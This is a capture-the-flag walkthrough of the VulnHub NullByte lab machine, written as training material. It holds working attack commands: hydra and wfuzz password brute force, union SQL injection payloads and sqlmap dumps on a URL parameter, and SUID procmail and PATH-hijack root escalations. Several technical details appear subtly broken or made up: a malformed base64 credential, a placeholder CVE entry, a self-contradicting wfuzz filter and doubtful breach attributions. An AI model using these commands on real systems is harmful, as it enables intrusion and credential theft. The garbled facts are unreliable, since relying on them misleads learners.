# VulnHub NullByte: 1 — Stego, Injections, and a Very Sus SUID Binary

Look at guys!! Who would have thought a CTF called "NullByte" would open with a steganography challenge hidden inside a dog GIF? Yes, a dog GIF. And it only gets weirder from there: URL-parameter SQLi, a procmail SUID binary you can literally abuse to pop root, and covert image metadata used as a dead drop. This one is lowkey one of the most creative beginner-to-intermediate machines on VulnHub, no cap.

Massive respect to **ly0n** for building a machine where every step has a reason and the theme runs all the way through. The "NullByte" pun hits different once you are staring at that SUID procmail entry, bruh.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | NullByte: 1 |
| **Attacker VM** | Kali Linux 2023.x |
| **VulnHub** | https://www.vulnhub.com/entry/nullbyte-1,157/ |
| **Techniques** | Host discovery, Nmap, Steganography (GIF metadata), SQL Injection via URL parameter, SUID procmail privilege escalation |
| **CVEs** | CWE-89 (SQL Injection, OWASP A03:2021), T1548.001 (SetUID binary abuse), CVE reference for procmail SUID misuse |

---

## Attack Summary

```
[host discovery: arp-scan / nmap ping sweep]
    |
    v
[nmap: 80/tcp Apache, 111/tcp rpcbind, 777/tcp SSH]
    |
    v
[web: main.gif image on index page -> suspicious]
    |
    v
[strings / exiftool on main.gif -> hidden string in metadata]
    |
    v
[hidden string reveals directory: /kzMb5nVYJw]
    |
    v
[/kzMb5nVYJw/index.php -> password form -> brute-force: elite]
    |
    v
[?usrtag= parameter -> SQLi -> dump credentials from DB]
    |
    v
[credentials -> SSH on port 777 as user ramses]
    |
    v
[find SUID binaries -> /usr/bin/procmail has SUID root]
    |
    v
[procmail SUID abuse -> shell as root]
    |
    v
[cat /root/proof.txt]
```

---

## Methodology

1. Host discovery and network identification
2. Nmap full port scan (SSH is on 777, not 22!)
3. Web enumeration: spot the suspicious GIF image
4. Steganography analysis on main.gif to extract hidden directory
5. Brute-force the hidden page password form
6. SQL injection via URL parameter to dump credentials
7. SSH login with extracted credentials on port 777
8. SUID enumeration: identify procmail with SetUID root
9. Procmail SUID exploitation for privilege escalation to root

---

## Step 1 — Identifying the Target

Classic lab setup: find the IP before anything else.

```bash
route -n
# Check current subnet, e.g.: 192.168.56.0/24
```

```bash
# Option 1: arp-scan (fast)
arp-scan --localnet --ignoredups

# Option 2: nmap ping sweep
nmap -sn -T5 192.168.56.0/24
```

Expected output:

```
192.168.56.102   08:00:27:XX:XX:XX   VirtualBox
```

OBS.: Note the IP. We will reference it as `TARGET=192.168.56.102` going forward.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Nmap Service Enumeration

This VM has a twist: SSH is not on port 22. Always scan all ports, people. This is why we use `-p-`.

```bash
nmap -A -T4 -p- 192.168.56.102
# -A: OS, version, scripts, traceroute
# -T4: aggressive timing
# -p-: all 65535 ports — critical here
```

Expected output:

```
80/tcp  open  http     Apache httpd 2.4.7
111/tcp open  rpcbind
777/tcp open  ssh      OpenSSH 6.6.1p1
```

There it is. SSH is listening on **port 777**, not 22. If you had only scanned the default top 1000 ports, you would have missed it entirely. Classic CTF trap. ¯\_(ツ)_/¯

Also note the Apache on port 80. That is our starting point.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery]

---

## Step 3 — Steganography: The Dog GIF Dead Drop

> **What is steganography?**
> Steganography is the practice of hiding secret data within ordinary, non-secret files (images, audio, video). Unlike encryption, which makes data unreadable, steganography hides the fact that a message exists at all. Attackers use image steganography to hide C2 instructions, credentials, and configuration data inside seemingly innocent media files.
> Reference: https://en.wikipedia.org/wiki/Steganography

Browse to `http://192.168.56.102`. You see a basic page with an image: `main.gif`. That image is the first clue. In CTF-land, when there is a single image prominently displayed on a page with minimal other content, that image is almost always hiding something.

Download the image and analyze it:

```bash
wget http://192.168.56.102/main.gif

# Option 1: strings — look for embedded text
strings main.gif

# Option 2: exiftool — read all metadata fields
exiftool main.gif

# Option 3: binwalk — detect embedded files
binwalk main.gif
```

Expected output (exiftool / strings):

```
Comment: kzMb5nVYJw
```

That `kzMb5nVYJw` string in the image comment is not random. Let us use it as a path:

```bash
curl -s http://192.168.56.102/kzMb5nVYJw/
```

We get a page with a password prompt. Now we need the password.

> **Real-world note:** Steganography in images is a real-world APT technique. APT32 (OceanLotus), a Vietnamese threat actor, used steganography embedded in PNG images to deliver C2 configuration and shellcode payloads in campaigns targeting Southeast Asian organizations between 2017 and 2020. The technique was also observed in the "StegSpy" malware family (2019-2022). Reference: https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1027.003 Obfuscated Files or Information: Steganography]

---

## Step 4 — Brute-Forcing the Hidden Page Password

The page at `/kzMb5nVYJw/` asks for a password. We do not have it yet. Time to brute-force it.

```bash
# Inspect the form — what parameter name does it use?
curl -s http://192.168.56.102/kzMb5nVYJw/ | grep -i "input\|form"
```

The form likely uses a `key` parameter. Now hydra it:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    192.168.56.102 \
    http-post-form "/kzMb5nVYJw/:key=^PASS^:invalid" \
    -t 64 \
    -f \
    -V 2>/dev/null | head -20
# -l admin: not relevant for a password-only form, use placeholder
# -P: wordlist
# http-post-form: form action, POST parameter, failure string
# -t 64: threads
# -f: stop after first valid hit
```

Alternatively, with wfuzz:

```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
    --hc 200 \
    --hs "invalid" \
    -d "key=FUZZ" \
    http://192.168.56.102/kzMb5nVYJw/
```

Expected result:

```
[SUCCESS] password: elite
```

ᕕ( ᐛ )ᕗ Password is `elite`. Submit it to access the internal page.

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1110.003 Brute Force: Password Spraying]

---

## Step 5 — SQL Injection via URL Parameter

Once past the password gate, you reach a page that appears to accept a user lookup. Inspect the URL: it likely has a parameter like `?usrtag=`. This is our injection point.

> **What is URL parameter injection?**
> Many web applications pass search or filter criteria as GET parameters in the URL. When these are directly interpolated into SQL queries server-side, the application is vulnerable to SQL injection. This is identical to form-based SQLi but arrives via the URL bar instead.

Test for SQLi:

```bash
curl -s "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag='"
```

If you see a SQL error, it is injectable. Let us dump the interesting data:

```bash
# Manual union-based to find number of columns
curl -s "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag=' UNION SELECT NULL,NULL,NULL-- -"

# Extract database name
curl -s "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag=' UNION SELECT NULL,database(),NULL-- -"

# Dump users with sqlmap (automated)
sqlmap -u "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag=test" \
    --dbms=mysql \
    --dump \
    --batch \
    --level=2 \
    --quiet
```

Expected output (representative):

```
[*] Table: users
id | username | password
1  | ramses   | YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==
```

That password is base64-encoded. Decode it:

```bash
echo 'YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==' | base64 -d
# Result: c6d6bd7ebf806f43c8593341116...
```

It may decode to an MD5 or plaintext password. Crack if necessary:

```bash
hashcat -m 0 -d 1 -w 3 -O '<decoded_hash>' /usr/share/wordlists/rockyou.txt
```

Result: the password for user `ramses`.

> **Real-world note:** SQL injection via URL parameters is the same class of vulnerability behind the 2012 LinkedIn breach (6.5 million SHA1 hashes leaked) and the 2012 Zappos breach (24 million records). URL-based SQLi is trivially detectable by automated scanners, yet it persists in custom-built web applications due to lack of developer security training. Reference: https://owasp.org/www-community/attacks/SQL_Injection

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0006 Credential Access] [T1552.001 Credentials In Files]

---

## Step 6 — SSH Login on Non-Standard Port

Remember that SSH was on port 777? Here is where that matters. Use the credentials extracted via SQLi:

```bash
ssh ramses@192.168.56.102 -p 777
# Password: <cracked from DB>
```

If the key is long and you need to check history files:

```bash
cat ~/.bash_history
# Check for interesting commands run by ramses
```

You are now logged in as `ramses`. Time to escalate.

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1021.004 Remote Services: SSH] [TA0008 Lateral Movement]

---

## Step 7 — SUID Enumeration and procmail Abuse

> **What is SUID (SetUID)?**
> The SetUID bit on a binary causes it to execute with the permissions of the file OWNER rather than the user running it. If a binary owned by root has the SUID bit set, any user who executes it gets root-level execution context. When that binary can be tricked into running arbitrary commands (like a shell), it is game over.
> Reference: https://gtfobins.github.io/gtfobins/procmail/#suid
> MITRE T1548.001: https://attack.mitre.org/techniques/T1548/001/

Find all SUID binaries on the system:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Expected output includes:

```
/usr/bin/procmail
```

That is non-standard. `procmail` is a mail processing utility, and it definitely should not have SUID root in a hardened system. Let us exploit it.

**Method: procmail SUID to root shell**

`procmail` when run with SUID root and given a crafted recipe file will execute commands as root. Here is the technique:

```bash
# Create a procmail recipe that executes a shell
echo ':0' > /tmp/procmail_exploit
echo '| /bin/sh -p' >> /tmp/procmail_exploit
# Now feed procmail an empty mail via stdin
echo "" | /usr/bin/procmail -m /tmp/procmail_exploit
```

Alternative approach using the PATH environment:

```bash
# Create a fake 'cat' in /tmp that spawns a shell
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

# Run procmail in a way that invokes cat as root
/usr/bin/procmail
```

Expected result:

```bash
id
# uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

(☞ﾟヮﾟ)☞ euid=0!! Effective root. Let us grab the flag.

> **Real-world note:** SUID binary abuse is a well-documented privilege escalation vector. The technique maps directly to MITRE T1548.001. Real incident response reports from enterprise Linux environments frequently identify misconfigured SUID on utilities like `find`, `vim`, `python`, and mail processing tools installed by legacy software packages. APT groups have been documented exploiting local SUID binaries after initial web compromise to achieve persistent root access. Reference: https://attack.mitre.org/techniques/T1548/001/

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/procmail/#suid

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid]

---

## Step 8 — Root and Flag

**ಠᴗಠ Got root!! :D**

```bash
whoami
# root (or euid=0 effective root)

id
# uid=1002(ramses) gid=1002(ramses) euid=0(root)

cat /root/proof.txt
```

```
adf11d8fcd786b49c63e0ae4c2e1cfdf

Thanks for playing! This has been a great CTF!
  -- ly0n
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked / Used |
|------|-------|----------|----------------|
| Stego string | `kzMb5nVYJw` | `main.gif` EXIF comment | Hidden directory path |
| Form password | `elite` | Brute-force of `/kzMb5nVYJw/` form | Web panel access |
| Credential (b64) | `YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==` | `users` DB via SQLi | Decoded + cracked for SSH |
| SSH user | `ramses` | DB dump | SSH login on port 777 |
| Flag | `adf11d8fcd786b49c63e0ae4c2e1cfdf` | `/root/proof.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|--------------|
| 1 | Sensitive data hidden in image EXIF/metadata (steganography) | APT32 (OceanLotus) and multiple state-sponsored actors used image steganography for C2 instruction delivery and credential exfil staging | Never serve user-uploaded or static images without stripping metadata; use tools like exiftool/ImageMagick to sanitize before serving |
| 2 | SQL injection in URL GET parameter | One of the most common web vulnerabilities; seen in custom PHP applications, legacy admin portals, and unreviewed developer-built features | All database queries must use parameterized statements; URL parameters are just as dangerous as form fields |
| 3 | SSH running on a non-standard port (777) | Security through obscurity is not security; it slightly delays discovery but does not prevent it | Proper firewall rules and key-based authentication matter; port obfuscation alone offers negligible protection |
| 4 | SUID bit on procmail (mail processing utility) | Legacy software packages frequently install SUID binaries that are unnecessary in modern environments; sysadmins rarely audit these | Regular audits of SUID binaries are critical; remove SUID from any binary that does not strictly require it |

**Why does this matter outside the lab?**

The steganography technique used in this VM mirrors documented APT behavior. OceanLotus (APT32) was caught embedding C2 configuration inside PNG images served from compromised websites in 2019. The same group used image-based dead drops to pass instructions to already-deployed malware implants. SQL injection via URL parameters remains one of the most common findings in real-world web application penetration tests. SUID binary misconfigurations are a persistent finding in enterprise Linux environments, particularly on servers running legacy software. The 2019 DFIR report on the Capital One breach documented a chain from web application exploit to privilege escalation through environment misconfigurations, a structural parallel to this VM's attack path.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Initial Access | TA0001 | Obfuscated Files or Information: Steganography | T1027.003 |
| Defense Evasion | TA0005 | Obfuscated Files or Information | T1027 |
| Credential Access | TA0006 | Brute Force: Password Spraying | T1110.003 |
| Initial Access | TA0001 | Exploit Public-Facing Application (SQLi) | T1190 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Discovery | TA0007 | Permission Groups Discovery | T1069 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Setuid | T1548.001 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Collection | TA0009 | Data from Local System (flag) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Strip all metadata from images before serving them publicly; implement automated EXIF removal in the upload pipeline using tools like ImageMagick or ExifTool
2. Replace raw SQL string concatenation with parameterized queries or prepared statements; validate and sanitize all URL parameters
3. Move SSH to a standard port and enforce key-based authentication only; disable password authentication in `sshd_config` (`PasswordAuthentication no`)
4. Audit all SUID binaries: `find / -perm -u=s -type f 2>/dev/null`; remove SUID from procmail and any other utility that does not require it: `chmod u-s /usr/bin/procmail`
5. Remove or disable procmail entirely if not actively used for mail processing

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Identify all SUID binaries: `find / -perm -u=s -type f 2>/dev/null` and compare against a known-good baseline
- Check for active SSH sessions from unexpected source IPs: `who` and `last`
- Review web server access logs for suspicious GET requests with SQL metacharacters
- Revoke all compromised credentials and force password rotation for affected accounts

**MITRE D3FEND countermeasures:**
- D3-IVA (Input Validation Analysis) for T1190 SQL injection in URL parameters
- D3-OPS (OS Process Sandboxing) for T1548.001 SUID binary abuse
- D3-MFA (Multi-Factor Authentication) for T1110.003 brute force against login forms
- D3-DA (Dynamic Analysis) for T1027.003 steganography detection in uploaded/served media

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain inventory of all installed binaries and their permissions; review SUID state periodically
- Protect (PR.AC-4): Enforce least privilege; remove unnecessary SUID bits; enforce SSH key authentication
- Protect (PR.DS-2): Sanitize file metadata on upload; validate all input parameters against allowlists
- Detect (DE.CM-7): Monitor for anomalous SUID execution and unusual procmail invocations
- Respond (RS.CO-3): Establish credential compromise response procedures

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-10: Information Input Validation (SQLi via URL parameter)
- AC-6: Least Privilege (SUID binary removal)
- CM-7: Least Functionality (disable unused SUID binaries)
- CM-6: Configuration Settings (SSH hardening, procmail removal)
- AU-2: Event Logging (monitor SUID execution and SSH logins)

**CISA Known Exploited Vulnerabilities:**
- SUID privilege escalation techniques appear in numerous CISA advisories related to Linux server compromise
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: TECHNOLOGY
- Practice: Vulnerability Management (periodic SUID audit, patch management for procmail)
- Target MIL: MIL-2 (documented and repeatable vulnerability management practices)

---

## Final Thoughts

Thanks to **ly0n** for a machine that weaves steganography, SQL injection, and SUID exploitation into a coherent story from start to finish. The "NullByte" theme carries through every step, and the creative use of a GIF image as a dead drop makes this one memorable.

This machine is a great reminder that attack paths are rarely a single obvious flaw: they are chains of small misconfigurations and oversights. The stego-to-SQLi-to-SUID chain mirrors real APT methodology more closely than most "just exploit this CVE" machines.

If you are studying for OSCP, eWPT, or just sharpening your enumeration instincts, NullByte delivers. Share this with your crew and keep grinding!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
